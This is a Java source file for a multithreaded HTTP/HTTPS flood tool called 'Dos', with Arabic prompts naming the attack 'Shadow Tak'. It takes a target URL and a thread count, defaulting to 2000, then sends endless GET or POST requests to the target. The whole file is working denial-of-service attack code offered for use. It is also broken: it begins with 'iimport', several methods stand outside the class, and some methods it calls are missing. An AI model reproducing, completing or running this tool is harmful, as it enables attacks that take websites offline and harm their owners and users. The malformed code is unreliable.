iimport java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;
import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {

    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }

    public static void main(String[] args) throws Exception {
        String url = "";
        int attackingAmount = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("مطور الأداة SJGD أدخل رابط الموقع: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("بدء الهجوم على الرابط: " + url);

        String[] SUrl = url.split("://");

        System.out.println("فحص اتصال الموقع");
        if (SUrl[0].equals("http") || SUrl[0] == "http") {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("ضبط هجوم DDoS: Shadow Tak");

        System.out.print("عدد الخيوط: ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 2000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("طريقة الهجوم: ");
        String option = in.nextLine();
        int ioption = 1;
        if (option.equals("get") || option.equals("GET")) {
            if (SUrl[0].equals("http") || SUrl[0] == "http") {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0].equals("http") || SUrl[0] == "http") {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);

        System.out.println("بدء الهجوم");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("انتهت الخيوط الرئيسية");
    }
}


    private void getAttack(String url) throws Exception {
    URL obj = new URL(url);
    HttpURLConnection con = (HttpURLConnection) obj.openConnection();
    con.setRequestMethod("GET");
    con.setRequestProperty("User-Agent", USER_AGENT);

    int responseCode = con.getResponseCode();
    System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
}

private void sslPostAttack(String url) throws Exception {
    URL obj = new URL(url);
    HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
    con.setRequestMethod("POST");
    con.setRequestProperty("User-Agent", USER_AGENT);
    con.setRequestProperty("Accept-Language", "en-US,en;");
    String urlParameters = "out of memory";

    // يجب تعيين هذه الخاصية إلى صحيح للسماح بإرسال البيانات
    con.setDoOutput(true);

    // يجب كتابة بيانات المعاملات في OutputStream
    try (OutputStream outputStream = con.getOutputStream()) {
        outputStream.write(urlParameters.getBytes());
    }

    int responseCode = con.getResponseCode();
    System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
}

private void sslGetAttack(String url) throws Exception {
    URL obj = new URL(url);
    HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
    con.setRequestMethod("GET");
    con.setRequestProperty("User-Agent", USER_AGENT);

    int responseCode = con.getResponseCode();
    System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
}
